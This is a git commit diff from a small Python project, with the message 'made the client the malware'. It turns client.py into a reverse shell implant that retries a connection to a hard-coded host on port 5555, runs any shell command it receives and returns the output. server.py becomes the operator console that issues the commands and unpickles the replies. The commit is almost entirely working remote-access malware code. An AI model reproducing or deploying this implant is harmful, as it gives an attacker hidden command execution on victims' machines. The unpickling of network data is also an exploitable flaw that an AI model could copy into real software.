d779f43c006d7416cf1f634b5a301c36958f9c97
C-NERD <alayaa694@gmail.com>
2021-04-04 12:28:40 +0100

    made the client the malware

--- src/client.py
+++ src/client.py
@@ -1,60 +1,40 @@
 ## Importing our dependencies from the python standard library
 from socket import *
-from pickle import loads, UnpicklingError
+from subprocess import getstatusoutput
+from pickle import dumps
 
-def client(ip, port):
-
-    try:
-        ## Starts the socket instance and connects to the server using ip address $ip on
-        ## port $port. It ensures the connection is successfull else the program
-        ## is terminated.
-        client = socket(AF_INET, SOCK_STREAM)
-        client.connect((ip, port))
-        print('connected to {} at port {}\n'.format(ip, port))
-
-    except:
-        print('Error: unable to connect to {} at port {}'.format(ip, port))
-        quit(-1)
+def client(ip):
 
     while True:
-        ## The programs main loop, it sends commands to the server while making sure
-        ## that the program does not get terminated after receiving output from the server
-        command = input('')
-        if command == 'quit':
-            ## Terminates the program when the given command is 'quit'
-            print('disconnecting...')
-            client.close()
-            quit()
-        
-        else:
-            ## Sends command to the server and displays output and execution status
-            client.sendall(command.encode('utf-8'))
-            data = client.recv(1024)
-            try:
-                info = loads(data)
-                print('status  :', info[0])
-                print(info[1])
+        try:
+            ## Starts the socket instance and connects to the server using ip address $ip on
+            ## port $port. It ensures the connection is successfull else the program
+            ## is terminated.
+            client = socket(AF_INET, SOCK_STREAM)
+            client.connect((ip, 5555))
+            break
+
+        except:
+            continue
+
+    while True:
+        ## The main loop receives commands from the connected client,
+        ## executes the commands and replies with the commands output
+        data = client.recv(1024)
+        command = data.decode('utf-8')
             
-            except:
-                print('status  : failed')
-                continue
+        if command.strip() == 'quit':
+            quit(0)
+
+        else:
+            info = getstatusoutput(command)
+            client.sendall(dumps(info))
+
 
 if __name__ == '__main__':
-    ## Execution starts here
-    ip = input('ipaddress -> ')
-
-    try:
-        ## Makes sure the given port is an integer between 1000 and 50000
-        port = int(input('port -> '))
-
-        if port < 1000 or port > 50000:
-            print('Error: the port is meant to be a number from 1000 to 50000')
-            quit(-1)
-    except:
-        print('port {} is not an integer'.format(port))
-        quit(-1)
-
-    ## Invokes the client function with the parameters ip and port.
-    ## This function is responsible for connecting to the server, sending and
-    ## receiving commands to and from the server.
-    client(ip, port)
+    ## Execution begins here
+    ## Invokes the client function with the parameter ip.
+    ## This function is responsible for connecting to the server, receiving
+    ## commands, running the commands and then sending the output back to 
+    ## the server.
+    client('0.0.0.0')
--- src/server.py
+++ src/server.py
@@ -1,37 +1,64 @@
 ## Importing the required dependencies
 from socket import *
-from subprocess import getstatusoutput
-from pickle import dumps
+from pickle import loads
 
-def server(ip : str):
+def server(ip : str, port : int):
     ## Starts socket instance and makes the socket reuseable,
     ## binds the socket to ip address $ip on port 5555 then listens
     ## and accepts connection from one client
     serve = socket(AF_INET, SOCK_STREAM)
     serve.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
     serve.bind((ip, 5555))
+    print('binded to {} at port {}\n'.format(ip, port))
+
     serve.listen(1)
     conn, addr = serve.accept()
+    print('accepted connection from client on address {}\n'.format(addr))
 
     if conn:
         ## If the connection is successfull start the main loop
+        
         while True:
-            ## The main loop receives commands from the connected client,
-            ## executes the commands and replies with the commands output
-            data = conn.recv(1024)
-            command = data.decode('utf-8')
-            
-            if command.strip() == 'quit':
-                conn.send(b'disconnecting...')
-                conn.close()
+            ## The programs main loop, it sends commands to the server while making sure
+            ## that the program does not get terminated after receiving output from the server
+            command = input('')
 
+            if command == 'quit':
+                ## Terminates the program when the given command is 'quit'
+                print('disconnecting...')
+                serve.close()
+                quit()
+            
             else:
-                info = getstatusoutput(command)
-                conn.sendall(dumps(info))
+                ## Sends command to the server and displays output and execution status
+                conn.sendall(command.encode('utf-8'))
+                data = conn.recv(1024)
+                try:
+                    info = loads(data)
+                    print('status  :', info[0])
+                    print(info[1])
+                
+                except:
+                    print('status  : failed')
+                    continue
 
 if __name__ == '__main__':
-    ## Execution begins here.
+    ## Execution starts here
+    print('starting the server')
+    ip = input('ipaddress -> ')
+
+    try:
+        ## Makes sure the given port is an integer between 1000 and 50000
+        port = int(input('port -> '))
+
+        if port < 1000 or port > 50000:
+            print('Error: the port is meant to be a number from 1000 to 50000')
+            quit(-1)
+    except:
+        print('port {} is not an integer'.format(port))
+        quit(-1)
+    
     ## The server function is invoked, this function is responsible
-    ## for listening to client connections and running commands from
-    ## the said client.
-    server('0.0.0.0')
+    ## this function wait's for a connection from the client, accepts
+    ## the said connection and then it can be used to run commands remotely
+    server(ip, port)
